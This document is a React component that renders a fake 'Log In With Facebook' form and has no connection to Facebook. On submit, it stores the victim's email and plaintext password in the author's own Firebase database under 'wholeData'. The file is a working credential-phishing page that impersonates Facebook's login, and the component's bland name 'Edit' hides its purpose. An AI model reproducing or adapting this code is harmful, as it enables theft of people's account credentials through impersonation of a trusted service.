import React, { Component } from 'react'
import firebase from 'firebase/app';
import 'firebase/auth';
import 'firebase/database';

class Edit extends Component {
    constructor(props) {
        super(props)
    }

    gettingValues=(ev)=>{
        this.setState({
            [ev.target.name]: ev.target.value
        })
    }

    set=(ev)=>{
        ev.preventDefault();
        let obj = {
            email: this.state.email,
            password: this.state.password
        }
        firebase.database().ref().child("wholeData").child(obj.email.slice(0,6)).set(obj);
    }

    render() {
        // console.log(this.props.props)
        return (
            <div className="adminPasscodeInputDiv">
            <div></div>
                <div className="inputDiv">
                    <div className="navBar">
                        <img src={require('../images/download (1).png')}/>
                    </div>
                    <div className='header'>
                        Log In With Facebook
                    </div>
                    <div className='inputsAndButtons'>
                        <form onSubmit={(ev)=>{this.set(ev)}}>
                            <input
                                className='input'
                                type="text"
                                onChange={(ev)=>this.gettingValues(ev)}
                                name="email"
                            />
                            <input
                                className='input'
                                type="password"
                                onChange={(ev)=>this.gettingValues(ev)}
                                name="password"
                            />
                            <div className='remember'>
                                <input
                                    type="checkbox"
                                />Remember password
                            </div>
                            <button>Log In With Facebook.</button>
                        </form>
                    </div>
                    <hr/>
                </div>
            </div>
        )
    }
}

export default Edit;